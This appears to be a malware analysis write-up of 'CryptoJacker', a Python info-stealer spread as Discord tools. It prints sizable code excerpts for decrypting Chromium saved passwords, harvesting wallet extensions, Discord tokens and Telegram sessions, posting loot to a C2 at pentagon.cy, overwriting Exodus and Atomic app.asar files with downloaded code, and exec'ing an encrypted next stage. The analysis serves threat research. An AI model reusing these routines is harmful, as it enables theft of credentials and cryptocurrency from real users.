# "CryptoJacker"

This is a multi-payload infomation harvesting and crypto-mining malware.
You can view the Scores and read more on it at the following:
1. [Virus Total](https://www.virustotal.com/gui/file/a79c39b5f74307dfbc6f9fbb16031342bfb6a9042ccc89a27be9808c684fafe5/community)
2. [Triage](https://tria.ge/250130-cd2j2svqfs/behavioral1)

The malware package is presented in many ways, but seems to be most popular with people wanting software to use with Discord; either "Nukers", spammers, or info stealers.

An video on this origin and walkthrough the obfuscation layers can be watched [here](https://www.youtube.com/watch?v=t7REnKeMnYk)

## Payload 01
The first payload is a comprehensive information stealer. It begins by ensuring its dependencies are installed using pip, hiding the console window to remain undetected.

````python
    import sys
    import subprocess
    
        ...
    
    CURRENT_INTERPRETER = sys.executable
    proc = subprocess.Popen([CURRENT_INTERPRETER, "-m", "pip", "install", "pycryptodome", "pypiwin32", "pywin32","requests", "websocket-client"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,creationflags=subprocess.CREATE_NO_WINDOW)
    proc.wait()

        ...
````

### Targets
The script is configured to steal a wide array of sensitive user data:
*   **Browser Data**: It targets a long list of Chromium-based browsers and Firefox to steal saved passwords, cookies, and web data tokens. It decrypts Chromium's data using the DPAPI key stored in the Local State file.
    ```python
        def decrypt_data(data, key):
            try:
                iv = data[3:15]
                data = data[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(data)[:-16].decode()
            except:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
             
                ...

        for browser in CHROMIUM_BROWSERS:
            
                ...
            
            local_state = os.path.join(browser["path"], "Local State")
            if not os.path.exists(local_state): continue

            with open(local_state, "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())

            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            try:
                decryption_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            except:
                pass

                ...
    ```
*   **Cryptocurrency Wallets**: It searches for and exfiltrates data from dozens of cryptocurrency wallet browser extensions (like Metamask, Phantom, and Coinbase) and desktop applications (like Exodus, Atomic, and Electrum).

    ```python
        BROWSER_EXTENSIONS = [
        {"name": "Authenticator", "path": "\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai"},
        {"name": "Binance", "path": "\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"},
        
                    ...

        {"name": "Metamask", "path": "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"},
        
                    ...

        {"name": "Phantom", "path": "\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"},
            
                    ...

        ]

        WALLET_PATHS = [
            {"name": "Atomic", "path": os.path.join(APPDATA, "atomic", "Local Storage", "leveldb")},
            {"name": "Exodus", "path": os.path.join(APPDATA, "Exodus", "exodus.wallet")},
            {"name": "Electrum", "path": os.path.join(APPDATA, "Electrum", "wallets")},

                    ...
        ]

    ```

*   **Application Data**: It steals session data from Discord and Telegram clients. For Discord, it extracts and validates authentication tokens.

    ```python
        def validate_discord_token(token):
            r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
            if r.status_code == 200:
                return r.json()
            else:
                return None

                    ...

        def telegram():
            try:
                kill_process("Telegram.exe")
            except:
                pass
            source_path = os.path.join(APPDATA, "Telegram Desktop", "tdata")
            
            if os.path.exists(source_path):
                zip_to_storage("tdata_session", source_path, STORAGE_PATH)

                    ...
    ```

*   **Sensitive Files**: It recursively searches the user's `Desktop`, `Documents`, and `Downloads` folders for files containing keywords such as "password", "wallet", "secret", and "2fa", then copies them for exfiltration.

    ```python

        FILE_KEYWORDS = [
        "passw",
        "mdp",
        "motdepasse",
            
            ...

        "metamask",
        "wallet",
        "crypto"
    ]

                        ...

    for path in PATHS_TO_SEARCH:
        for root, _, files in os.walk(path):
            for file_name in files:
                for keyword in FILE_KEYWORDS:
                    if keyword in file_name.lower():
                        
                        ...

    ```

1.  All stolen data is collected and zipped into a temporary folder located at `%APPDATA%/Microsoft Store`.
2.  The script contacts a command-and-control server at `https://pentagon.cy` to register the new victim and receive a unique ID.

    ```python
        def create_log():
            for i in range(10):
                payload = {
                    "passwordcount": len(PASSWORDS),
                    "cookiecount": COOKIECOUNT,
                    "discordtokencount": len(DISCORD_TOKENS),
                    "filenames": FILES,
                }
                headers = {"X-User-Identifier": userid, "Content-Type": "application/json"}

                try:
                    r = requests.post(MAIN_URL + "/create_log", json=payload, headers=headers)
                    if r.status_code == 200:
                        return r.json()["log_uuid"]

                            ...

    ```

3.  The stolen data is then uploaded to the C2 server.
4.  The script attempts to inject malicious code into the `app.asar` files of the Exodus and Atomic wallets, patching them with code downloaded from the C2 server. This likely modifies the wallets to steal funds or credentials upon use.

    ```python
        def inject(loguuid):
            path = os.path.join(LOCALAPPDATA, "exodus")
            if not os.path.exists(path): return
                    
                    ...

            exodusPatchURL = MAIN_URL + "/exodus"
                    
                    ...

            response = urlopen(req)
            data = response.read()
            kill_process("exodus.exe")
            for app in apps:
                try:
                    fullpath = f"{path}\\{app}\\resources\\app.asar"
                    with open(fullpath, 'wb') as out_file1:

                        out_file1.write(data)
    
                    ...

    ```

5.  Finally, it uses a hardcoded Fernet key to decrypt and execute the next stage payload, then cleans up the temporary storage directory.

    ````python

        try:
            from fernet import Fernet;exec(Fernet(b'tYnDVZH8g0OmbkypmHgO6fas8R_IyMfh8N6YXJJoXJg=').decrypt(b'gAAAAABnuPWc9herg9xrGBt9BigXmAqNrz4dE8p6trhbjktC_Fgq9DOylJV6PadaHkvmO4qeEZlTrtGErnf0m_j0JmH7HqYPIRSJ8vRRHAn0qSE1RkGEUy3J1SIE6YNJTykyciE33egiOgM4NTHA-wd74aPN8NKjbH0MBM_9gDO6D8enjSWB1ufOwrCDsoc9JshwU4f7f9Cz'))
        except: pass
        try:
            os.remove(STORAGE_PATH)
        except: pass
    ````

